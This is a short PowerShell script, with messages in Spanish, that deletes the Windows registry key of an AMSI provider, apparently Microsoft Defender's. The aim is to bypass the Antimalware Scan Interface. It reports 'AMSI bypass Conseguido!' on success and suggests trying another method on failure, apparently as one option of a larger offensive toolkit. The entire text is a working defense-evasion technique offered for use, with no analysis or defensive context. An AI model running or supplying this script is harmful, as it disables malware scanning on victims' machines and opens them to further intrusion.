Write-Host
Write-Host "Eliminando la clave del registro del proveedor de AMSI:"
try
{  
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
    Write-Host
    Write-Host "---> AMSI bypass Conseguido!"-ForegroundColor Green -BackgroundColor DarkBlue
    Write-Host
    pause
    Clear-Host
}
catch
{
    Write-Host
    Write-Host "---> No ha funcionado, intente otro método" -ForegroundColor Red -BackgroundColor Yellow
    pause
    Clear-Host
}
break

